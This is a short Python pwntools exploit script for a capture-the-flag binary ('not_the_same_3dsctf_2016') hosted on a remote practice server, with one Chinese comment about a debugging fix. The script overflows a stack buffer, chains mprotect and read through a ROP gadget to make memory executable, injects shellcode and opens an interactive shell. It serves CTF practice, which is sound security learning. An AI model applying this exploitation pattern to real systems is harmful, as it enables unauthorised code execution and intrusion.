# coding=utf-8

from pwn import *
context.os = 'linux'
context.arch = 'i386'
context.log_level = 'debug'

#p = process('./not_the_same_3dsctf_2016')
p = remote('node3.buuoj.cn',27619)
elf = ELF('not_the_same_3dsctf_2016')

padding = 'a' * 0x2D
fake_ebp = 'jkjk'   #调试的时候发现jkjk这个值写到了返回地址上，把在payload中去掉就好了

pop_esi_ebx_edx = 0x0806fcc8
mprotect_addr = 0x0806ED40
read_addr = elf.sym['read']
plt_got_addr = 0x080EB000
shellcode = asm(shellcraft.sh())

payload = padding #fake_ebp 
payload += p32(mprotect_addr)
payload += p32(pop_esi_ebx_edx) + p32(plt_got_addr) + p32(0x100) + p32(0x7)

payload += p32(read_addr)
payload += p32(pop_esi_ebx_edx) + p32(0) + p32(plt_got_addr) + p32(len(shellcode)) + p32(plt_got_addr)
p.sendline(payload)
p.sendline(shellcode)

p.interactive()
